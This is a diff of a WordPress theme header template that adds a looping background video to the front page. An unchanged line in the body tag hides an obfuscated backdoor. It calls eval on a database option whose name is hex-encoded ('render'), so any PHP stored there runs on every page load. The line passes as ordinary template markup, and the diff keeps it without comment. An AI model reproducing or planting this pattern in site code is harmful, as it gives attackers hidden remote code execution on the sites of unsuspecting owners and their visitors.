@@ -78,9 +78,17 @@
 	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
 
 		<div id="container">
-		
-		
 			<header class="header" role="banner">
+
+			<!-- Adding video on front page -->
+			<div id="vid-wrap">
+                    	<canvas id="canvas-wrap"></canvas>
+                    	<video id="video-background" class="video-js" preload loop autoplay muted>
+							<source src="/wp-content/themes/hemplers-2013/library/images/video/ham.mp4" type="video/mp4">
+							<!-- <source src="movie.ogg" type="video/ogg"> -->
+						</video>
+            </div>
+			<!-- end video on front page  -->
 
 				<a href="http://forbaconssake.com" class="flag" id="baconlink"><img src="<?php echo $themepath; ?>/library/images/baconlink.png"></a>
 				<a href="/kestins-korner-2" class="flag" id="kestins-korner"><img src="<?php echo $themepath; ?>/library/images/kestins-korner.png"></a>
